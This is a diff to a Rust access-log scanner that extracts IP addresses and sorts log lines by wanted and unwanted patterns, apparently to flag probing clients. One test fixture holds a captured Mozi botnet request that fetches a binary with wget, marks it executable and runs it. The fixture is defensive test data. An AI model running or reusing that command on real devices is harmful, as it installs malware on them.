@@ -1,4 +1,4 @@
-use tracing::{debug, error, info, instrument, warn};
+use tracing::{debug, error, info, instrument, trace, warn};
 use tracing_subscriber::{fmt, EnvFilter};
 
 use flate2::bufread::GzDecoder;
@@ -15,7 +15,7 @@ use std::{
 
 
 lazy_static! {
-    static ref IP: Regex = Regex::new(r"(?P<ip>^((25[0-5]|(2[0-4]|1\d|[1-9]|)\d)\.){3}(25[0-5]|(2[0-4]|1\d|[1-9]|)\d)$)").unwrap();
+    static ref IP: Regex = Regex::new(r"(?P<ip>((25[0-5]|(2[0-4]|1\d|[1-9]|)\d)\.){3}(25[0-5]|(2[0-4]|1\d|[1-9]|)\d))").unwrap();
 
     /// WANTED have higher priority over UNWANTED
     static ref WANTED: Regex = Config::wanted();
@@ -65,18 +65,23 @@ fn decode_file(mut file: File) -> io::Result<Vec<u8>> {
 fn main() {
     initialize();
     let access_log = Config::access_log();
-    let maybe_log = File::open(&access_log).and_then(decode_file);
-    let maybe_log = maybe_log
+    let decoded_log = File::open(&access_log).and_then(decode_file);
+    let maybe_log = decoded_log
         .map(|input_data| {
             let input_data_length = input_data.len();
-            let buffer = input_data_length - Config::buffer();
-            debug!("The uncompressed input file is at position: {buffer}.");
-            input_data.iter().skip(buffer).cloned().collect::<Vec<u8>>()
+            debug!("Input data length: {input_data_length}");
+            if Config::buffer() == 0 || Config::buffer() >= input_data_length {
+                debug!("Loading full uncompressed input file of size: {input_data_length}.");
+                input_data
+            } else {
+                let buffer = input_data_length - Config::buffer();
+                debug!("The uncompressed input file is now at position: {buffer}.");
+                input_data.iter().skip(buffer).cloned().collect::<Vec<u8>>()
+            }
         })
         .map(|input_contents| {
-            let contents = String::from_utf8_lossy(&input_contents);
-            let contents_split = contents.split('\n');
-            contents_split
+            String::from_utf8_lossy(&input_contents)
+                .split('\n')
                 .filter_map(|line| {
                     if line.is_empty() || is_partial(line) {
                         None
@@ -91,9 +96,11 @@ fn main() {
             info!("Scanning the access_log…");
             let mut ips: Vec<String> = vec![];
             for line in lines {
+                trace!("Processling line: '{line}'");
                 match &IP.captures(&line) {
                     Some(ip_match) => {
                         let ip = &ip_match[0];
+                        trace!("Checking IP: {ip}");
                         let w_reg = &WANTED;
                         if w_reg.is_match(&line) {
                             debug!(
@@ -141,9 +148,16 @@ fn is_partial(line: &str) -> bool {
 #[test]
 fn test_regex_patterns() {
     let r = &IP;
-    let ips = ["1.241.215.240", "192.241.215.24", "192.1.21.240", "1.2.1.2"];
+    let ips = [
+        "1.241.215.240 - -   ",
+        "192.241.215.24",
+        "192.1.21.240",
+        "1.2.1.2",
+        "188.147.102.254 - -",
+    ];
     for ip in ips {
         let the_ip = r.captures(ip).unwrap().name("ip").unwrap().as_str();
+        println!("The IP: {the_ip}");
         assert!(r.is_match(the_ip));
     }
 }
@@ -187,6 +201,7 @@ fn test_regex_match_wanted_and_unwanted() {
         r#"42.2.69.148 - - [09/Nov/2021:16:35:09 +0100] "27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$ HTTP/1.0" 400 157 "-" "-""#,
         r#"167.71.13.196 - - [10/Nov/2021:06:59:27 +0100] "GET /config.json HTTP/1.1" 404 153 "-" "l9explore/1.3.0""#,
         r#"67.71.13.196 - - [10/Nov/2021:06:59:29 +0100] "GET /login.action HTTP/1.1" 404 153 "-" "l9explore/1.3.0""#,
+        r#"188.147.102.254 - - [09/May/2022:23:30:22 +0200] "POST /php/event.php HTTP/1.1" 301 162 "http://gminagniewino2.home.pl/" "Mozilla/5.0 (Linux; Android 10; VOG-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Mobile Safari/537.36""#,
     ];
 
     let w_reg = &WANTED;
